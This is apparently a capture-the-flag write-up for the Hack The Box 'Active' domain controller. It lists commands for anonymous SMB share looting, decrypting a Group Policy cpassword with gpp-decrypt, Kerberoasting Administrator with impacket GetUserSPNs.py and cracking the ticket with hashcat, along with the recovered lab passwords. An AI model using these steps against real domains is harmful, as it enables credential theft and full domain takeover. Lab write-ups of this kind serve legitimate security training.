# HTB - Active

#HTB #Active #ActiveDirectory #GPP #cpassword #Kerberoasting #SMB #impacket #hashcat

Target: `active.htb` — Windows Server 2008 R2 SP1 domain controller (host `DC`)

> [!note] IP changed between sessions as the box was reset: `10.129.36.137` and `10.129.98.114` both appear in the captured output below.

## Kill chain

1. Full port scan → classic DC service spread (53/88/135/139/389/445/464/636/3268…)
2. **Anonymous** SMB enumeration → `Replication` share is world-readable
3. Recursively pull `Replication` → Group Policy `Groups.xml` with a GPP `cpassword`
4. `gpp-decrypt` the cpassword → **svc_tgs** service-account password
5. Re-enumerate shares *as svc_tgs* → `Users` share now READ ONLY → user flag
6. `GetUserSPNs.py` as svc_tgs → **Administrator has an SPN** (`active/CIFS:445`)
7. Request the TGS → `-m 13100` hash → crack with rockyou → Administrator password
8. Authenticate as Administrator → root flag

## Services

Key ports (full output in [[CTF Notes/HTB/Boxes/Active/nmap|nmap]]):

- 53/tcp    domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
- 88/tcp    kerberos-sec  Microsoft Windows Kerberos
- 135/tcp   msrpc · 139/tcp netbios-ssn · 445/tcp microsoft-ds
- 389, 3268 ldap          AD LDAP — Domain: `active.htb`, Site: Default-First-Site-Name
- 464/tcp   kpasswd5 · 593/tcp ncacn_http · 636, 3269 tcpwrapped
- 5722/tcp  msrpc (SYSVOL replication) · 9389/tcp .NET Message Framing
- 47001 + 491xx  Microsoft HTTPAPI / RPC ephemeral range

```
| smb2-security-mode:  Message signing enabled and required
|_clock-skew: -1d00h00m10s
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1
```

## Findings

**Anonymous SMB read on `Replication`** — see [[CTF Notes/HTB/Boxes/Active/smbclient|smbclient]] / [[CTF Notes/HTB/Boxes/Active/smbmap|smbmap]].

| Share | Anonymous | As svc_tgs |
|---|---|---|
| ADMIN$ / C$ / IPC$ | NO ACCESS | NO ACCESS |
| NETLOGON | NO ACCESS | READ ONLY |
| **Replication** | **READ ONLY** | READ ONLY |
| SYSVOL | NO ACCESS | READ ONLY |
| **Users** | NO ACCESS | **READ ONLY** |

**GPP cpassword.** The recursive pull of `Replication` yields:

```
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

Group Policy Preferences stored the account password AES-encrypted with a **key Microsoft published**, so any readable `Groups.xml` is a free credential — `gpp-decrypt` reverses it.

**Kerberoastable Administrator.** `Administrator` is a member of `CN=Group Policy Creator Owners` and carries the SPN `active/CIFS:445` — so any authenticated user can request a service ticket encrypted with that account's password hash and crack it offline.

## Creds

- `svc_tgs:GPPstillStandingStrong2k18` — from the GPP cpassword
- `Administrator:Ticketmaster1968` — cracked from the TGS-REP hash (see [[CTF Notes/HTB/Boxes/Active/hashcat|hashcat]])

## Foothold

```bash
# Anonymous share listing
smbclient -L \\\\10.129.98.114

# Recursive pull of the readable share
smbclient //10.129.36.137/Replication -c "recurse; prompt; mget *"

# Decrypt the cpassword out of Groups.xml
gpp-decrypt <cpassword>
```

User flag — `Users` share becomes readable once authenticated as svc_tgs:

```
./Users//SVC_TGS/Desktop
fw--w--w--   34   user.txt
```

```bash
smbclient \\\\10.129.98.114\\Users --user svc_tgs
```

## Privesc

Kerberoast — see [[CTF Notes/HTB/Boxes/Active/getuserspn.py|getuserspn.py]]:

```bash
# Enumerate SPNs
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-host active.htb

# Request the ticket
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-host active.htb -request
```

```
ServicePrincipalName  Name           MemberOf
--------------------  -------------  ------------------------------------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
```

Crack it (RC4 / etype 23 → mode **13100**):

```bash
hashcat -m 13100 adminticket.hash /usr/share/wordlists/rockyou.txt
# ... :Ticketmaster1968     (cracked in ~6s at 1840.9 kH/s)
```

Then connect as Administrator to reach the root flag.

## Files in this folder

| File | Contents |
|---|---|
| [[CTF Notes/HTB/Boxes/Active/attack path\|attack path]] | The original terse step list |
| [[CTF Notes/HTB/Boxes/Active/nmap\|nmap]] | Full port + refined service scan output |
| [[CTF Notes/HTB/Boxes/Active/smbclient\|smbclient]] | Anonymous listing + recursive `Replication` pull |
| [[CTF Notes/HTB/Boxes/Active/smbmap\|smbmap]] | Share permissions anonymous vs svc_tgs, `Users` tree |
| [[CTF Notes/HTB/Boxes/Active/getuserspn.py\|getuserspn.py]] | SPN enumeration + captured TGS-REP hash |
| [[CTF Notes/HTB/Boxes/Active/hashcat\|hashcat]] | Full crack session output |

> [!note] **Vault references** — [[Services/Active Directory/Kerberos|Kerberos]] (why an SPN is roastable) · [[Tools/AD/impacket-kerberos-scripts|impacket-kerberos-scripts]] (`GetUserSPNs.py`) · [[Tools/Credential Dumping/gpp-decrypt|gpp-decrypt]] (the cpassword step) · [[Tools/Auth/hashcat|hashcat]] (mode 13100) · [[Tools/Lateral Movement/smbclient|smbclient]] · [[Tools/Lateral Movement/smbmap|smbmap]]
